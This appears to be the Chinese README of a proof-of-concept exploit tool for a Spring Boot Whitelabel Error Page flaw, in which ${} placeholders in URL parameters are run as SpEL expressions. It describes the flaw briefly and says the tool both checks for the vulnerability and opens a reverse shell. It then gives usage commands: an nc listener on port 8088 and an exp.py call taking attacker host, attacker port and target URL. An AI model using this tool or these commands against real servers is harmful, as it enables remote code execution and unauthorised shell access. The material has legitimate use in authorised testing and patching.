# SpringBoot-whitelabel-error-rce EXP
[English README.md](README.md)  
---

## 漏洞介绍
1、spring boot处理参数值出现错误，流程进入`org.springframework.util.PropertyPlaceholderHelper`类

2. 此时会使用`parseStringValue`方法递归解析URL中的参数值。

3、“${}”包围的内容会被“org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration”类的“resolvePlaceholder”方法解析为SpEL表达式执行，导致RCE漏洞。

---

## EXP介绍
通过这个EXP可以判断是否存在漏洞并反弹shell。

首先比如访问`/article?id=xxx`时，页面会报错，状态码为`500`：`Whitelabel Error Page`，可以使用当前的`POC & EXP`来尝试

---

## 使用方法
````shell
nc -lvvp 8088
python3 exp.py -lhost 127.0.0.1 -lport 8088 -t "http://127.0.0.1:9091/article?id="
````
> -lhost：监听主机  
   -lport：监听端口  
   -t：目标URL（**注意：需要包含主机、端口、路径、参数和"="。**）

![](help.jpg)  
![](success.jpg)